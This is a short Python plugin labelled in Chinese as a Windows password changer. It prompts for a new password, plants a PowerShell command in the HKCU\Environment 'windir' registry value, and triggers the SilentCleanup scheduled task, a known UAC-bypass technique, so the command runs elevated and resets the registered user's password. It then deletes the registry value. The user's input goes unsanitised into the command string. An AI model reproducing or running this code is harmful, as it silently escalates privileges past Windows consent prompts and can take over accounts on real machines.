import os
from FuncBase import FuncBase
import webbrowser


class Changepassword(FuncBase):

    @property
    def Description(self):
        return("Windows密碼變更")

    def Run(self):
        password = input("請輸入新密碼:")
        a = "$a=get-computerinfo -Property ""osregistereduser"";$b=$a.OsRegisteredUser;$adsi = [ADSI]''WinNT://%computername%'';$existing=$adsi.children ^| Where-Object {($_.SchemaClassName -eq ''user'') -and ($_.Name -eq $b )};$password=''" + \
            password+"'';$existing.SetPassword($password)"
        com = "'powershell "+a+";#'"
        os.system(
            "powershell Set-ItemProperty -Path ""HKCU:\Environment"" -Name ""windir"" -Value "+com)
        os.system(
            "schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I")
        os.system(
            "powershell Remove-ItemProperty -Path ""HKCU:\Environment"" -Name ""windir""")
